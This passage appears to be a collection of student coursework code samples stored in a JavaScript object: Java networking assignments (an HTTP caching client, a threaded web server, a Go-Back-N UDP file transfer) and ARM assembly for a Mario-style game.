		  String lastModifiedString = conn.getHeaderField("Last-Modified");
		  // System.out.println(lastModified);

		  // 200 = ok
		  // 304 = Not Modified
		  if (responseCode == 200) {

		    //System.out.println("reading file from server");

		    InputStreamReader in = new InputStreamReader(conn.getInputStream());

		    // write to file
		    // use url path as file name
		    String path = urlobj.getPath();
		    // System.out.println("path"+path);

		    if (path.startsWith("/"))
		      path = path.substring(1);

		    int pos = path.lastIndexOf("/");

		    String folder = "";
		    if (pos &gt 0)
		      folder = path.substring(0, pos);

		    System.out.println(folder);

		    File dir = new File(folder);

		    if (!dir.exists())
		      dir.mkdirs();

		    FileWriter fr = new FileWriter(new File(path));

		    int ch = 0;
		    while ((ch = in.read()) != -1) {
		      fr.write(ch);
		    }

		    in.close();
		    fr.close();

		    // update catalog
		    catalog.put(url, lastModified);

		    // write catalog to file
		    PrintWriter pw = new PrintWriter(CATALOG_FILENAME);

		    // for each item
		    Iterator&ltEntry&ltString, Long&gt&gt it = catalog.entrySet().iterator();

		    // loop through iterator
		    while (it.hasNext()) {
		      Map.Entry&ltString, Long&gt pair = (Map.Entry&ltString, Long&gt) it.next();
		      pw.println(pair.getKey() + " " + pair.getValue());

		    }

		    pw.close(); // close file

		  }

		}

		/**
		 * Returns the Last-Modified time associated with the object specified by
		 * the parameter url.
		 *
		 * @param url
		 *            URL of the object
		 * @return the Last-Modified time in millisecond as in Date.getTime()
		 */
		public long getLastModified(String url) {
		  long millis = 0;

		  if (catalog.containsKey(url)) {
		    millis = catalog.get(url);
		  }

		  return millis;
		}

		}`
	},
	nw3: {
		type: 'java',
		code: `
		/**
		* A multi-threaded web server to serve web objects to HTTP clients over the Internet.
		* The server should support non-persistent HTTP. This means that once an HTTP request is served, the server closes the TCP connection.
		* To inform the client that the connection is closed, include the header line "connection:close" in the server response.
		* Your server is only required to handle GET requests. It has to check if the requested object is available,
		* and if so return a copy of the object
		* to the client. Return responses with the following status codes only:
		* 200 OK
		* 400 Bad Request
		* 404 Not Found
		* Your web server should be able to handle more than one connection simultaneously. To handle multiple connections, the server has to be multi-threaded.
		* In the main thread, the server listens on a fixed port. When it receives a TCP connection request, it sets up a TCP connection through another socket
		* and services the request in a separate worker thread. That is, once the server accepts a connection, it will spawn a new thread to parse the incoming
		* HTTP request, transmit the object, etc.
		*/

		import java.util.*;
		import java.io.*;
		import java.net.InetAddress;
		import java.net.ServerSocket;
		import java.net.Socket;

		public class WebServer extends Thread{
		private volatile boolean shutdown = false;
		private int port;

		/**
		 * Default constructor to initialize the web server
		 *
		 * @param port
		 *            The server port at which the web server listens &gt 1024
		 *
		 */
		public WebServer(int port){
		  this.port = port;
		}

		/**
		 * The main loop of the web server Opens a server socket at the specified
		 * server port Remains in listening mode until shutdown signal
		 *
		 */
		public void run(){
		while(!this.shutdown){
		  try{

		    ServerSocket serverSocket = new ServerSocket(this.port);


		    //Wait for clients
		    while(true){

		      //Client connects
		      Socket socket = serverSocket.accept();

		      //Get client address
		      InetAddress address = socket.getInetAddress();

		      //Get client host
		      String hostname = address.getHostName();

		      //Print out connection
		      System.out.println(hostname + " connected to server " + " at address " + address.toString() + "\\n");

		      //Make client thread
		      try{
		        new ClientThread(socket).start();
		      }

		      //Client error
		      catch (IOException ex){
		        System.out.println(ex.getMessage());
		      }

		    }

		  }

		  //Server error
		  catch (Exception e){
		    System.out.println("Error: " + e.getMessage());
		  }
		}
		}

		/**
		 * Signals the server to shutdown.
		 *
		 */
		public void shutdown(){
		  this.shutdown = true;
		}

		//Client Thread
		class ClientThread extends Thread{
		  private DataOutputStream outputStream;
		  private BufferedReader inputStream;

		  ClientThread(Socket socket) throws IOException{
		    //Connect to client streams
		    inputStream = new BufferedReader(new InputStreamReader(socket.getInputStream()));
		    outputStream = new DataOutputStream(socket.getOutputStream());
		  }

		  //Client thread runs here
		  public void run(){

		    try{
		      //Respond to messages from the client
		      String s = inputStream.readLine();
		      System.out.println(s);

		      //Get request
		      if (s.toUpperCase().startsWith("GET")){
		        // get file name
		        // GET /index.html HTTP/1.0
		        int pos = 5;
		        int pos2 = s.toUpperCase().indexOf(" HTTP");
		        String filename = s.substring(pos, pos2);

		        //Default file
		        if(filename.length() &lt= 0)
		          filename = "index.htm";

		        FileInputStream requestedfile = null;

		        try{
		          // try to open the file,
		          requestedfile = new FileInputStream(filename);
		        }

		        //File open error
		        catch (Exception e){
		          try{
		            //Cannnot open the file send a 404
		            outputStream.writeBytes(constructHeader(404, 0));

		            //Close the stream
		            outputStream.close();
		          }

		          catch (Exception e2){
		            System.out.println(e2.getMessage());
		          }
		        }

		        //Send file to client
		        try{
		          int file_type = 5;

		          if (filename.endsWith(".zip") || filename.endsWith(".exe") || filename.endsWith(".tar")) {
		            file_type = 3;
		          } else if (filename.endsWith(".jpg") || filename.endsWith(".jpeg")) {
		            file_type = 1;
		          } else if (filename.endsWith(".gif")) {
		            file_type = 2;
		          } else if (filename.endsWith(".pdf")) {
		            file_type = 4;
		          }

		          //Send OK and file type
		          outputStream.writeBytes(constructHeader(200, file_type));

		          //Send file
		          while (true){

		            //Read char from file
		            int ch = requestedfile.read();

		            if (ch == -1){
		              break;
		              //End of file
		            }

		            //Send to client
		            outputStream.write(ch);
		          }

		          //Clean up the files, close open handles
		          outputStream.close();
		          requestedfile.close();
		        }

		        catch (Exception e3){
		          System.out.println(e3.getMessage());
		        }
		      }

		      //Method not supported
		      else{
		        //Send method not supported header
		        try{
		          outputStream.writeBytes(constructHeader(501, 0));
		          outputStream.close();
		          return;
		        }

		        //Catch error
		        catch (Exception e4){
		          System.out.println(e4.getMessage());
		        }
		      }

		    } catch (Exception e5){

		      System.out.println(e5.getMessage());
		    }
		  }

		  //Construct client header
		  private String constructHeader(int return_code, int file_type){

		    String s = "HTTP/1.0 ";

		    switch (return_code) {
		    case 200:
		      s = s + "200 OK";
		      break;
		    case 400:
		      s = s + "400 Bad Request";
		      break;
		    case 403:
		      s = s + "403 Forbidden";
		      break;
		    case 404:
		      s = s + "404 Not Found";
		      break;
		    case 500:
		      s = s + "500 Internal Server Error";
		      break;
		    case 501:
		      s = s + "501 Not Implemented";
		      break;
		    }

		    s = s + "\r\\n";
		    s = s + "Connection: close\r\\n";
		    s = s + "Server: Threaded WebServer\r\\n"; //Server name

		    //Send content type
		    switch (file_type){

		    case 0:
		      break;
		    case 1:
		      s = s + "Content-Type: image/jpeg\r\\n";
		      break;
		    case 2:
		      s = s + "Content-Type: image/gif\r\\n";
		    case 3:
		      s = s + "Content-Type: application/x-zip-compressed\r\\n";
		    case 4:
		      s = s + "Content-Type: application/pdf\r\\n";
		    default:
		      s = s + "Content-Type: text/html\r\\n";
		      break;
		    }

		    //End of the httpheader
		    s = s + "\r\\n";

		    return s; //Return header string
		  }

		}

		/**
		 * A simple driver.
		 */
		public static void main(String[] args){
		  int serverPort = 2225;

		  // parse command line args
		  if (args.length == 1){
		    serverPort = Integer.parseInt(args[0]);
		  }

		  System.out.println("starting the server on port " + serverPort);

		  WebServer server = new WebServer(serverPort);

		  server.start();
		  System.out.println("server started. Type \"quit\" to stop");
		  System.out.println(".....................................");

		  Scanner keyboard = new Scanner(System.in);
		  while (!keyboard.next().equals("quit"));

		  System.out.println();
		  System.out.println("shutting down the server...");
		  server.shutdown();
		  System.out.println("server stopped");
		}

		}`
	},
	nw4: {
		type: 'java',
		code: `
		import java.io.DataInputStream;
		import java.io.DataOutputStream;
		import java.io.File;
		import java.io.FileInputStream;
		import java.net.DatagramPacket;
		import java.net.DatagramSocket;
		import java.net.InetAddress;
		import java.net.Socket;
		import java.util.Timer;

		public class FastFtp {

		private int windowSize;
		private int rtoTimer;
		private int serverUDP;
		private DatagramSocket UDPsocket;
		private InetAddress address;
		private TxQueue q;
		private Timer timer;
		private ReceiverThread receiver;

		/**
		 * Constructor to initialize the program
		 *
		 * @param windowSize
		 *            Size of the window for Go-Back_N in terms of segments
		 * @param rtoTimer
		 *            The time-out interval for the retransmission timer
		 */
		public FastFtp(int windowSize, int rtoTimer) {
		  this.windowSize = windowSize;
		  this.rtoTimer = rtoTimer;
		}

		/**
		 * Sends the specified file to the specified destination host: 1. send
		 * file/connection infor over TCP 2. start receving thread to process coming
		 * ACKs 3. send file segment by segment 4. wait until transmit queue is
		 * empty, i.e., all segments are ACKed 5. clean up (cancel timer, interrupt
		 * receving thread, close sockets/files)
		 *
		 * @param serverName
		 *            Name of the remote server
		 * @param serverPort
		 *            Port number of the remote server
		 * @param fileName
		 *            Name of the file to be trasferred to the rmeote server
		 */
		public void send(String serverName, int serverPort, String fileName) {
		  try {
		    // Send file/connection infor over TCP
		    File file = new File(fileName);

		    // Open TCP connection to the server
		    Socket clientSocket = new Socket(serverName, serverPort);

		    // Get input output streams
		    DataOutputStream outToServer = new DataOutputStream(clientSocket.getOutputStream());
		    DataInputStream inFromServer = new DataInputStream(clientSocket.getInputStream());

		    // Send file name, file length, and local UDP port number to the
		    // Server over TCP
		    outToServer.writeUTF(fileName);
		    outToServer.writeLong(file.length());
		    outToServer.writeInt(serverPort);
		    outToServer.flush();

		    // Receive server UDP port number over TCP
		    serverUDP = inFromServer.readInt();

		    // Make data gram socket
		    UDPsocket = new DatagramSocket();
		    address = InetAddress.getByName(serverName);

		    // Start receving thread to process coming ACKs
		    receiver = new ReceiverThread(UDPsocket, this);
		    receiver.start();

		    // Open file
		    FileInputStream fis = new FileInputStream(file);

		    // Send file segment by segment
		    int seqNum = 1; // segment sequence number

		    // A queue with capacity of 10 segments
		    q = new TxQueue(windowSize);

		    // Payload
		    byte[] payload = new byte[100];
		    int numBytes = 0;

		    // While not end of file
		    while ((numBytes = fis.read(payload)) != -1) {

		      // Create a segment with next sequence number
		      Segment segment = new Segment(seqNum++, payload);

		      // Wait while transmission queue is full (i.e., window is full)
		      while (q.isFull());

		      // Send the segment and do whatever is necessary for reliable
		      // Transfer
		      processSend(segment);

		    }

		    // Wait until transmit queue is empty, i.e., all segments are ACKed
		    while (!q.isEmpty())
		      ;

		    // Clean up (cancel timer, interrupt receving thread, close
		    // Sockets/files)
		    if (timer != null)
		      timer.cancel();
		    receiver.terminate();
		    UDPsocket.close();
		    clientSocket.close();
		    fis.close();
		  } catch (Exception ex) {
		    System.out.println(ex.getMessage());
		  }

		}

		public synchronized void processSend(Segment seg) {

		  // Send seg to the UDP socket
		  // Create a DatagramPacket that can be used to send segment

		  try {

		    byte[] data = seg.getBytes();
		    DatagramPacket pkt = new DatagramPacket(data, data.length, address, serverUDP);
		    UDPsocket.send(pkt);

		    System.out.println("sent packet" + seg.getSeqNum());

		    // Add seg to the transmission queue
		    q.add(seg);

		    // If this is the first segment in transmission queue, start the
		    // Timer
		    if (seg.getSeqNum() == 1) {
		      timer = new Timer(true);
		      timer.schedule(new TimeoutHandler(this), rtoTimer);
		    }
		  } catch (Exception ex) {
		    System.out.println(ex.getMessage());
		  }
		}

		public synchronized void processACK(Segment ack) {

		  System.out.println("process ack" + ack.getSeqNum());

		  if (timer != null)
		    timer.cancel();

		  timer = null;
		  /**
		    remove all segements that are acked by this ACK from the transmission
		    queue
		    if there are any pending segments in transmission queue, start the
		    timer
		        **/
		  int size = q.size();

		  for (int i = 0; i &lt size; i++) {

		    try {
		      Segment segment = q.element();
		      q.remove();

		      // ack has no payload
		      if (segment.getSeqNum() != ack.getSeqNum()) {

		        // add segment fo re transmit
		        q.add(segment);
		      }
		    }

		    catch (InterruptedException e) {
		    }

		  }

		  if (q.size() &gt 0) {
		    timer = new Timer(true);
		    timer.schedule(new TimeoutHandler(this), rtoTimer);
		  }
		  // }
		}

		public synchronized void processTimeout() {
		  /**
		    Get the list of all pending segments from the transmission queue
		    Go through the list and send all segments to the UDP socket
		    If there are any pending segments in transmission queue, start the
		    Timer
		      **/

		  System.out.println("time out");

		  try {

		    // Get segments
		    Segment[] segments = q.toArray();

		    for (int i = 0; i &lt segments.length; i++) {

		      // Re transmit segments
		      byte[] data = segments[i].getBytes();
		      DatagramPacket pkt = new DatagramPacket(data, data.length, address, serverUDP);
		      UDPsocket.send(pkt);
		      System.out.println("time out sent packet" + segments[i].getSeqNum());

		    }

		    // Restart timer
		    if (segments.length &gt 0)
		    {
		      timer = new Timer(true);
		      timer.schedule(new TimeoutHandler(this), rtoTimer);
		    }

		  } catch (Exception ex) {
		    System.out.println(ex.getMessage());
		  }

		}

		/**
		 * A simple test driver
		 *
		 */
		public static void main(String[] args) {
		  // all srguments should be provided
		  // as described in the assignment description
		  if (args.length != 5) {
		    System.out.println("incorrect usage, try again.");
		    System.out.println("usage: FastFtp server port file window timeout");
		    System.exit(1);
		  }

		  // parse the command line arguments
		  // assume no errors
		  String serverName = args[0];
		  int serverPort = Integer.parseInt(args[1]);
		  String fileName = args[2];
		  int windowSize = Integer.parseInt(args[3]);
		  int timeout = Integer.parseInt(args[4]);

		  // send the file to server
		  FastFtp ftp = new FastFtp(windowSize, timeout);
		  System.out.printf("sending file \'%s\' to server...\\n", fileName);
		  ftp.send(serverName, serverPort, fileName);
		  System.out.println("file transfer completed.");
		}
		}`
	},
	nw5: {
		type: 'java',
		code: `
		import java.net.DatagramPacket;
		import java.net.DatagramSocket;

		public class ReceiverThread extends Thread {

		private DatagramSocket socket;
		private FastFtp fastFtp;
		private boolean terminated = false;

		// Define constructor
		public ReceiverThread(DatagramSocket socket, FastFtp fastFtp) {
		  this.socket = socket;
		  this.fastFtp = fastFtp;
		}

		// Terminate
		public void terminate() {
		  terminated = true;
		}

		// The run method
		public void run() {

		  // while not terminated:
		  while (!terminated) {
		    try {

		      // 1. receive a DatagramPacket pkt from UDP socket
		      byte[] buffer = new byte[Segment.MAX_SEGMENT_SIZE];
		      DatagramPacket packet = new DatagramPacket(buffer, buffer.length);
		      socket.receive(packet);

		      // 2. call processAck() in the main class to process pkt
		      byte[] bytes = packet.getData();
		      Segment segment = new Segment(bytes);
		      System.out.println("receive packet " + segment.getSeqNum());
		      fastFtp.processACK(segment);

		    } catch (Exception ex) {
		      System.out.println(ex.getMessage());
		    }

		  }
		}
		}`
	},
	nw6: {
		type: 'java',
		code: `
		import java.io.*;
		import java.io.IOException;
		import java.net.DatagramPacket;
		import java.net.DatagramSocket;
		import java.net.InetAddress;
		import java.net.ServerSocket;
		import java.net.Socket;
		import java.net.SocketException;

		public class UDPServer implements Runnable {

		public void run() {

		  byte[] in;
		  byte[] out;
		  DatagramSocket datagramSocket = null;

		  try {

		    datagramSocket = new DatagramSocket(10000);

		    System.out.println("waiting for connections");

		    ServerSocket serverSocket = new ServerSocket(2225);

		    Socket connectionSocket = serverSocket.accept();
		    DataInputStream inFromClient = new DataInputStream(connectionSocket.getInputStream());
		    DataOutputStream outToClient = new DataOutputStream(connectionSocket.getOutputStream());


		          // Receive from client
		    String filename = inFromClient.readUTF();
		    long fileLength = inFromClient.readLong();
		    int serverPort = inFromClient.readInt();

		    System.out.println("Received from client: " + filename + " " + fileLength + " " + serverPort);

		    // Send back udp port to client
		    outToClient.writeInt(10000);

		  } catch (IOException ex) {

		    System.out.println(ex.getMessage());
		    System.exit(0);
		  }

		  // Receive udp mesages
		  int count = 0;
		  while (true) {
		    try {

		      in = new byte[1024];
		      out = new byte[1024];

		      // Create our inbound datagram packet
		      DatagramPacket receivedPacket = new DatagramPacket(in, in.length);
		      datagramSocket.receive(receivedPacket);

		      // Get data
		      String text = new String(receivedPacket.getData());
		      System.out.println("String Received: " + text);


		              // Retrieve the IP Address and port number of the datagram
		      // Packet we've just received
		      InetAddress IPAddress = receivedPacket.getAddress();
		      int port = receivedPacket.getPort();

		      // Create a DatagramPacket which will return our message back to
		      // As a ACK skip some messages
		      if ((count++) % 4 != 0) {
		        DatagramPacket sendPacket = new DatagramPacket(in, in.length, IPAddress, port);
		        datagramSocket.send(sendPacket);
		      }

		    } catch (IOException ex) {
		      System.out.println(ex.getMessage());
		      datagramSocket.close();
		      System.exit(0);
		    }

		  }
		}

		// Start UDP server
		public static void main(String[] args) throws SocketException {

		  new Thread(new UDPServer()).start();
		}

		}`
	},
	m1: {
		type: 'arm',
		code: `
		.section    .init
		.globl     _ButtonFunctions

		_ButtonFunctions:
		    b ButtonFunctions

		.section .text

		ButtonFunctions:
		.globl BPress
		BPress:
		    ldr r0, =mario
		    ldr r4, [r0]
		    ldr r5, [r0,#4]
		    //Could do a power-pack ability here
		.globl YPress
		YPress:
		    //NOthing yet
		.globl SelPress
		SelPress:
		.globl STPress
		STPress:
		    push {r4-r10,lr}
		    mov r8, #0
		    mov r7, #0
		    //bl _gameMenu
		stread:
		    bl _ReadSNES
		stloop:
		    cmp r5, #15
		    bgt stread
		    ldr r5, =buttons            //load the address of the buffer into r5
		    ldrb r4, [r5, #4]           //load a byte from the buffer
		    cmp r4, #0
		    beq stdone
		    ldrb r4, [r5, #5]           //load a byte from the buffer
		    cmp r4, #0
		    beq upOpt
		    ldrb r4, [r5, #6]           //load a byte from the buffer
		    cmp r4, #0
		    beq downOpt
		    ldrb r4, [r5, #9]
		    cmp r4, #0
		    //beq restart
		    b stread

		stdone:
		    //bl clearmenu
		    pop {r4-r10,lr}
		    bx lr
		upOpt:
		    //bl pausemenu1
		upR:
		    bl _ReadSNES
		    ldr r5, =buttons
		    ldrb r4, [r5, #9]
		    cmp r4, #0
		    //beq clearmenu
		    //beq restart
		    ldrb r4, [r5, #6]
		    cmp r4, #0
		    beq downOpt
		    b upR

		downOpt:
		    //bl pausemenu2
		dR:
		    bl _ReadSNES
		    ldr r5, =buttons
		    ldrb r4, [r5, #9]
		    cmp r4, #0
		    //beq clearmenu
		    //beq Quit
		    ldrb r4, [r5, #5]
		    cmp r4, #0
		    beq upOpt
		    b dR

		.globl JPUPress
		JPUPress:
		    push {r4-r10,lr}
		    ldr r5, =mario
		    ldr r4, [r5]
		    ldr r7, [r5,#4]
		    mov r6, r7
		    sub r8, r7, #80 //max jump height
		jumpup:
		    sub r6, r6, #10  //jump height per frame
		    bl clearMario
		    str r6, [r5,#4]
		    bl drawMario
		    cmp r6, r8
		    bge jumpup
		    //bl _DetectCollisions
		    bl _ReadSNES
		    mov r0, #1000
		    bl WaitLong
		    ldr r9, =buttons
		    ldrb r10, [r9, #7]
		    cmp r10, #0
		    bleq UpRightPress
		    ldrb r10, [r9, #8]
		    cmp r10, #0
		    bleq UpLeftPress
		jumpdown:
		    add r6, r6, #10
		    bl clearMario
		    str r6, [r5,#4]
		    bl drawMario
		    cmp r6, r7
		    blt jumpdown
		    b downex
		    //bl _DetectCollisions
		    //cmp r0, #1
		    //beq downex
		    //cmp r0, #2
		    //beq enemykilled
		 downex:
		    pop {r4-r10,lr}
		    bx lr

		UpRightPress:
		    push {r4-r10, lr}
		    ldr r5, =mario
		    ldr r4, [r5]
		    
		    ldr r7, =0x40b
		    add r6, r4, #80
		    cmp r6, r7
		    blt UdrawR
		    beq UscreenR

		    ldr r7, =0x807
		    cmp r6, r7
		    blt UdrawR
		    beq UscreenR
		    //add screen 3 check
		UdrawR:
		    bl clearMario
		    str r6, [r5]
		    //bl _DetectCollisions
		    //cmp r0, #1
		    //beq doneR
		    //cmp r0, #2
		    //beq lifelost
		    bl drawMario
		    b UdoneR
		UscreenR:
		    bl updateScreen
		    bl clearMario
		    str r6, [r5]

		    //bl updateScreen
		    bl drawMario
		UdoneR:
		    pop {r4-r10,lr}
		    bx lr

		UpLeftPress:
		    push {r4-r10,lr}
		    ldr r5, =mario
		    ldr r4, [r5]
		    sub r6, r4, #80
		    cmp r6, #0
		    bgt UdrawL
		    b Udonel
		UdrawL:
		    bl clearMario
		    str r6, [r5]
		    //bl _DetectCollisions
		    //cmp r0, #1
		    //beq Udonel
		    //cmp r0, #2
		    //beq lifelost
		    bl drawMario
		Udonel:
		    pop {r4-r10, lr}
		    bx lr
		.globl JPLPress
		JPLPress:
		    push {r4-r10,lr}
		    ldr r5, =mario
		    ldr r4, [r5]
		    sub r6, r4, #15
		    cmp r6, #0
		    bgt drawL
		    b donel
		drawL:
		    bl clearMario
		    str r6, [r5]
		    //bl _DetectCollisions
		    //cmp r0, #1
		    //beq donel
		    //cmp r0, #2
		    //beq lifelost

		    bl drawMario
		donel:
		    pop {r4-r10, lr}
		    bx lr
		.globl JPRPress
		JPRPress:
		    push {r4-r10, lr}
		    ldr r5, =mario
		    ldr r4, [r5]
		    
		    ldr r7, =0x40b
		    add r6, r4, #15
		    cmp r6, r7
		    blt drawR
		    beq screenR

		    ldr r7, =0x807
		    cmp r6, r7
		    blt drawR
		    beq screenR
		    //add screen 3 check
		drawR:
		    bl clearMario
		    str r6, [r5]
		    //bl _DetectCollisions
		    //cmp r0, #1
		    //beq doneR
		    //cmp r0, #2
		    //beq lifelost
		    bl drawMario
		    b doneR
		screenR:
		    bl updateScreen
		    bl clearMario
		    str r6, [r5]

		    //bl updateScreen
		    bl drawMario
		doneR:
		    pop {r4-r10,lr}
		    bx lr
		.globl APress
		APress:
		.globl XPress
		XPress:
		.globl LBPress
		LBPress:
		.globl RBPress
		RBPress:`
	},
	m2: {
		type: 'arm',
		code: `
		@.section    .init
		@.globl     _DetectCollisions
		@
		@_DetectCollisions:
		@    b DetetectCollision
		@
		@
		@DetetectCollision:
		@	push	{r4-r10,lr}
		@	ldr r0, =mario
		@	ldr r4, [r0]
		@	ldr r5, [r0 + 4]
		@	ldr r9, =mariowidth
		@	ldr r9, [r9]
		@	ldr r10, =marioheight
		@	ldr r10, [r10]
		@	mov r9, #4
		@	mov r7, #0
		@	bl checkUp
		@	bl checkDown
		@	bl checkLeft
		@	bl checkRight
		@	pop		{r4-r10,lr}
		@	bx lr
		@
		@
		@checkUp:
		@	ldr r0, =block
		@	ldr r1, [r0, lsl r7]
		@	ldr r2, [r0 , r9, lsl r7]
		@	add r9, r5, r9
		@	add r7, r4, r10
		@	cmp r4, r1
		@	blt up1
		@	add r8, r1, blockWidth
		@ck:
		@	cmp r9, r2
		@	blt checkDown
		@ck1:
		@	cmp r5, r1
		@	blge _DestoryBlock
		@	movge r0, #1
		@ck2:
		@	cmp r5, r8
		@	blle _DestoryBlock
		@ck3:
		@	cmp r7, r1
		@	blge _DestoryBlock
		@ck4:
		@	cmp r7, r8
		@	blle _DestoryBlock
		@	add r7, r7, #3
		@	cmp r7, #number of blocks
		@	blt checkUp
		@	mov r9, #0
		@	mov r7, #0
		@checkDown:
		@	ldr r0, =enemy
		@	ldr r1, [r0, lsl r7]
		@	ldr r2, [r0, r9, lsl r7]
		@
		@checkLeft:
		@
		@
		@checkRight:`
	},
	m3: {
		type: 'arm',
		code: `
		.section .text
		.globl initialscreen
		initialscreen:
		  push {lr}
		    bl	InitFrameBuffer
		  bl initializeBackground
		  //get controller input

		  bl drawMario //inside here we will determine if mario current x is enought that we wont need to redraw, and only need to move all other elements

		  mov r0, #100
		  ldr r1, =0x64 //100
		  bl drawCloud
		  mov r0, #420
		  ldr r1, =0x14 //20
		  bl drawCloud
		  ldr r0, =0x2EE //1000
		  ldr r1, =0x1E //10
		  bl drawCloud

		  ldr r0, =block1      //make this the value to start printing mario  //this will be the address value to mario's x
		  ldr r0, [r0]
		  ldr r1, =block1 //starting y  //this will be the address value to mario's y
		  ldr r1, [r1, #4]
		  bl drawBlock

		  ldr r0, =cblock
		  ldr r0, [r0]
		  ldr r1, =cblock
		  ldr r1, [r1, #4]
		  bl drawCoinBlock

		  ldr r0, =block2      //make this the value to start printing mario  //this will be the address value to mario's x
		  ldr r0, [r0]
		  ldr r1, =block2 //starting y  //this will be the address value to mario's y
		  ldr r1, [r1, #4]
		  bl drawBlock

		  ldr r0, =shellEnemy
		  ldr r0, [r0]
		  ldr r1, =shellEnemy
		  ldr r1, [r1, #4]
		  bl drawShell

		  pop {lr}
		  mov pc, lr

		.globl initializeBackground
		initializeBackground:
		  //draw background
		  push {r7, r8, lr}
		  mov r0, #0    //pass in starting x
		  mov r1, #0    //pass in starting y
		  ldr r2, =background //address of picture
		  mov r7, #1024
		  mov r8, #768
		  bl  drawPicture

		  //draw floor
		  mov r0, #0 //starting x value
		  ldr r1, =0x22D//pass in starting y (557)
		  ldr r2, =floor //address of the floor
		  mov r7, #1024 //picture width
		  mov r8, #768 //picture height (218 + 550)
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawMario
		drawMario:
		  push {r7, r8, r9, r10, lr}
		  ldr r0, =mario      //make this the value to start printing mario  //this will be the address value to mario's x
		  ldr r0, [r0]
		  ldr r1, =mario //starting y  //this will be the address value to mario's y
		  ldr r1, [r1, #4]
		  ldr r9, =mario
		  ldr r9, [r9, #8]
		  cmp r9, #1
		  beq running2
		  ldr r2, =runningmario1
		  mov r10, #1
		  b SkipOtherMario
		running2: ldr r2, =runningmario2
		      mov r10, #0
		SkipOtherMario:
		    ldr r9, =mario
		    str r10, [r9, #8]
		    ldr r7, =0x29      //width of image (41)
		    add r7, r7, r0
		    ldr r8, =0x46    //height of image (70)
		    add r8, r8, r1
		    bl drawPicture
		    pop {r7, r8, r9, r10, lr}
		    mov pc, lr

		.globl clearMario
		clearMario:
			push {r7, r8, lr}
			ldr r0, =mario
			ldr r0, [r0]
			ldr r1, =mario
			ldr r1, [r1, #4]
			ldr r2, =clear
			ldr r7, =0x29     //width of image (41)
			add r7, r7, r0
			ldr r8, =0x46    //height of image (70)
			add r8, r8, r1
			bl drawPicture
			pop {r7, r8, lr}
			mov pc, lr

		.globl drawCloud
		drawCloud:
		  push {r7, r8, lr}
		  ldr r2, =cloud
		  mov r7, #134      //width of image (61)
		  add r7, r7, r0
		  ldr r8, =0x64    //height of image (117)
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawBlock
		drawBlock:
		  push {r7, r8, lr}
		  ldr r2, =normalBlock
		  mov r7, #45      //width of image (30)
		  add r7, r7, r0
		  mov r8, #45
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawCoinBlock
		drawCoinBlock:
		  push {r7, r8, lr}
		  ldr r2, =coinBlock
		  mov r7, #45      //width of image (30)
		  add r7, r7, r0
		  mov r8, #45
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawPipe
		drawPipe:
		  push {r7, r8, lr}
		  ldr r2, =pipeImage
		  mov r7, #83
		  add r7, r7, r0
		  mov r8, #85
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawDragon
		drawDragon:
		  push {r7, r8, lr}
		  ldr r2, =dragonImage
		  mov r7, #39
		  add r7, r7, r0
		  mov r8, #60
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawShell
		drawShell:
		  push {r7, r8, lr}
		  ldr r2, =shellImage
		  mov r7, #31
		  add r7, r7, r0
		  mov r8, #50
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawCastle
		drawCastle:
		  push {r7, r8, lr}
		  ldr r2, =castleImage
		  ldr r7, =0x166
		  add r7, r7, r0
		  ldr r8, =0x166
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawPit
		drawPit:
		  push {r7, r8, lr}
		  ldr r2, =pitImage
		  mov r7, #126
		  add r7, r7, r0
		  mov r8, #211
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl drawBowser
		drawBowser:
		  push {r7, r8, lr}
		  ldr r2, =bowserImage
		  mov r7, #69
		  add r7, r7, r0
		  mov r8, #104
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr


		.globl clearBox
		clearBox:
		  push {r7, r8, lr}
		  ldr r2, =clearBoxImage
		  mov r7, #45   //width of image (45)
		  add r7, r7, r0
		  mov r8, #45   //height of image (45)
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr

		.globl clearDragon
		clearDragon:
		    push {r7, r8, lr}
		    ldr r2, =clearDragonImage
		    mov r7, #39   //width of image
		    add r7, r7, r0
		    mov r8, #60   //height of image
		    add r8, r8, r1
		    bl drawPicture
		    pop {r7, r8, lr}
		    mov pc, lr

		.globl clearPipe
		clearPipe:
		  push {r7, r8, lr}
		  ldr r2, =clearPipeImage
		  mov r7, #83   //width of image
		  add r7, r7, r0
		  mov r8, #85   //height of image
		  add r8, r8, r1
		  bl drawPicture
		  pop {r7, r8, lr}
		  mov pc, lr



		.globl drawPicture
		drawPicture:
			push {r4, r5, r6, r7, r8,r9,r10, lr}
			mov	r4,	r0			  //Start X position of your picture
			mov r10, r4       //make a copy
			mov	r5,	r1        //starting y value
			mov	r6,	r2			  //Address of the picture
			mov	r7,	r7			//Width of your picture
			mov	r8,	r8			//Height of your picture
		drawPictureLoop:
		  	mov	r0,	r4			//passing x for ro which is used by the Draw pixel function
		  	mov	r1,	r5			//passing y for r1 which is used by the Draw pixel formula
		  	ldrh	r2,	[r6],#2			//setting pixel color by loading it from the data section. We load half word
		    ldr r9, =0x643f
		    cmp r2, r9
		    beq skip
		  	bl	DrawPixel
		skip:
		  	add	r4,	#1			//increment x position
		  	cmp	r4,	r7			//compare with image width
		  	blt	drawPictureLoop
		  	mov	r4,	r10			//reset x
		  	add	r5,	#1			//increment Y
		  	cmp	r5,	r8			//compare y with image height
		  	blt	drawPictureLoop
		  	pop {r4, r5, r6, r7, r8,r9,r10, lr}
		  	mov	pc,	lr			//return

		  /* Draw Pixel
		   *  r0 - x
		   *  r1 - y
		   *  r2 - color
		   */
		  DrawPixel:
		  	push	{r4}
		  	offset	.req	r4
		    // offset = (y * 1024) + x = x + (y << 10)
		  	add		offset,	r0, r1, lsl #10
